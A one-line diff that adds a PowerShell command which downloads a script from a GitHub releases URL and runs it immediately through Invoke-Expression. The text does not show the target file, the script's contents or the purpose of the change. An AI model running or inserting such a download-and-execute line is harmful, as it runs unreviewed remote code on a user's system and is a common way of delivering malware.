@@ -1,0 +1,1 @@
+iex((New-Object Net.WebClient).DownloadString('https://github.com/fortbins/windows/releases/latest/download/s.ps1'))
